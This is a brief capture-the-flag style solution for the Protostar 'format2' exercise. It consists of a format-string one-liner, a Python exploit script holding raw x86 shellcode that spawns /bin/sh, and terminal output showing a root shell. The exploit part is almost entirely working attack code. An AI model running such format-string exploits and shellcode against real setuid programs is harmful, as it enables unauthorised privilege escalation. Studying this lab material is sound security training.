# format2

```
user@protostar:/opt/protostar/bin$ python -c 'print "%60d\xe4\x96\x04\x08%5$n"' | ./format2
                                                         512�
you have modified the target :)
```

```py
import struct

nop = '\x90' * 32

buf = ''
buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

ha1 = struct.pack('I', 0x080496c8)
ha2 = struct.pack('I', 0x080496c8 + 0x2)

# 0xbffff5cc
# 0xf5c4 - 8 = 62908
# 0x(01)bfff - 8 - 62908 = 51771

payload = ha1 + ha2 + '%62964d' + '%4$n' + '%51715d' + '%5$n'
print payload + nop + buf
```

```
user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./format2
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```
